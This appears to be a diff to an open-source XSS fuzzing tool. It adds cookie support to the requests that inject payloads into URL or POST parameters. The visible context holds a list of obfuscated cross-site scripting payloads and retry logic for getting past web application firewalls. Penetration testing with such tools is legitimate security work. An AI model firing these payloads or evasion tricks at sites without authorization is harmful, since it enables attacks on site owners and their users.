@@ -21,7 +21,7 @@ fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confi
 '">payload<br attr="', '&#x3C;script&#x3E;', '<r sRc=x oNError=r>', '<x OnCliCk=(prompt)()>click',
 '<bGsOund sRc=x>']
 
-def fuzzer(url, param_data, method, delay, xsschecker):
+def fuzzer(url, param_data, method, delay, xsschecker, cookie):
     result = [] # Result of fuzzing
     progress = 0 # Variable for recording the progress of fuzzing
     for i in fuzzes:
@@ -33,9 +33,9 @@ def fuzzer(url, param_data, method, delay, xsschecker):
         param_data_injected = param_data.replace(xsschecker, fuzzy) # Replcaing the xsschecker with fuzz
         try:
             if method == 'GET': # GET parameter
-                r = requests.get(url + param_data_injected, timeout=10) # makes a request to example.search.php?q=<fuzz>
+                r = requests.get(url + param_data_injected, timeout=10, cookies=cookie) # makes a request to example.search.php?q=<fuzz>
             else: # POST parameter
-                r = requests.post(url, data=param_data_injected, timeout=10) # Seperating "param_data_injected" with comma because its POST data
+                r = requests.post(url, data=param_data_injected, timeout=10, cookies=cookie) # Seperating "param_data_injected" with comma because its POST data
             response = r.text
         except:
             print ('\n%s WAF is dropping suspicious conncections.' % bad)
@@ -50,7 +50,7 @@ def fuzzer(url, param_data, method, delay, xsschecker):
                 limit -= 1
                 sleep(1)
             try:
-                requests.get(url, timeout=5)
+                requests.get(url, timeout=5, cookies=cookie)
                 print ('\n%s Pheww! Looks like sleeping for %s%i%s seconds worked!' % (good, green, (delay + 1) * 2), end)
             except:
                 print ('\n%s Looks like WAF has blocked our IP Address. Sorry!' % bad)
